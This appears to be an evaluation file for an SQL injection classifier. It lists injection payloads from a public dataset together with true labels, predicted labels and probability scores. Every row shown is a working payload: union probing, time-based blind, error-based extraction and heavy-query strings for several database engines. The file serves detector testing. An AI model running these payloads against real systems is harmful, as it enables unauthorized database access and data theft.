text,source,true_label,pred_label,prob_sqli,correct
"1'  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  'dpdz' like 'dpdz",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' )  as ibqr where 5372 = 5372 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"-3361  )  )   union all select 2827,2827,2827,2827#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and 'iuao' = 'iuao,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1%""  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1"" )  as xioc where 7260 = 7260 or elt ( 5873 = 5873,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1"" )  as yekp where 3049 = 3049 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1  )  )   as ambt where 5198 = 5198 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1%""  )  )   union all select null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1"" or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and ""pxix"" = ""pxix",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1"" where 8727 = 8727",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999923706054688,1
"1  )  )   )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1""  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( ""xnsj"" like ""xnsj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""menm"" like ""menm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1""  )  )   as rpxd where 4929 = 4929",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1 )  as wust where 3884 = 3884 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1  )  )   as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"-4373'+ ( select 'rlht' where 2285 = 2285 union all select 2285,2285,2285#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
-3096' or 3821 = 5539 and 'zrth' = 'zrth,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999923706054688,1
1'|| ( select 'fwph' where 3791 = 3791,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"-5320 where 8051 = 8051 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1 where 5691 = 5691 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1  )  )   )  union all select null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
1' )  and  ( 1414 = 4775 ) *4775 and  ( 'mlmw' = 'mlmw,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (  'wmoo' like 'wmoo",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1'|| ( select 'bpml' where 7360 = 7360 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   ) ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1"" )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1%'  )  )   union all select null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
end and   (  (  'eqoc' like 'eqoc,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999923706054688,1
"1' where 6795 = 6795 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1' or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and 'scye' like 'scye",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
-1765' )  order by 1--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999922513961792,1
"-8080"" )  as nlos where 8917 = 8917 union all select 8917,8917,8917,8917--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( 'ffzv' = 'ffzv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1%"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
-7758%'  )  )   )  or 3038 = 3038,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
"1  )  )   as cusv where 4871 = 4871 and elt ( 1210 = 1210,sleep ( 5  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"-5616""  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""hdrb"" like ""hdrb",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1""  )  )   as ufba where 4049 = 4049",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999881982803345,1
1 where 4641 = 4641,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999910593032837,1
"1""  )  )   as mlid where 1047 = 1047 union all select null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1'  )  )   and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (  'prjf' = 'prjf,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
1 )  as msat where 1267 = 1267,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999923706054688,1
1' where 7036 = 7036,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999922513961792,1
if ( 5896 = 4251 )  select 5896 else drop function xmyk--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and   (  (   ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1 where 1299 = 1299,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999916553497314,1
"1""  )  )   and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  ""gxqq"" = ""gxqq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999922513961792,1
"1 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"select * from generate_series ( 4592,4592,case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and ""dsae"" = ""dsae",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
-2291  )  )   or 4067 = 5666#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999914169311523,1
"1%'  )  )   procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (  '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and ""gknn"" like ""gknn",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1'  )  )   and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'rggg' = 'rggg",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1'+ ( select ophz where 9158 = 9158 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo  )  )  +',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1 )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"-7858' )  union all select 1541,1541,1541,1541,1541,1541#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"-2397  )  )   as oizy where 1746 = 1746 union all select 1746,1746,1746,1746,1746,1746#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1'  )  )   procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (  'asdc' like 'asdc",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-8410"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""xhzr"" = ""xhzr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1' )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1"" where 1051 = 1051 union all select null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1""  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( ""fpkm"" like ""fpkm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
-5751 )  as jybu where 4739 = 4739 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""aixs"" = ""aixs",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1  )  )   or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1%'  )  )   and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1' )  where 3572 = 3572,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1%' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1"" )  as rgod where 5766 = 5766 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-6292 )  union all select 7499,7499,7499,7499,7499,7499,7499--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999922513961792,1
"1' and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and 'rtbm' = 'rtbm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
"-9845"" )  as xpis where 1936 = 1936 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1%' )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"-5644""  )  )   )  or make_set ( 9354 = 9354,7185 )  and   (  (   ( ""evcf"" = ""evcf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"select pg_sleep ( 5 )  and  ( ""pjql"" like ""pjql",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999923706054688,1
"1"" )  where 1793 = 1793",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999923706054688,1
"1"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1%'  )  )   or elt ( 5873 = 5873,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999922513961792,1
"1"" )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( ""ilrk"" = ""ilrk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1%""  )  )   and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-5032' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
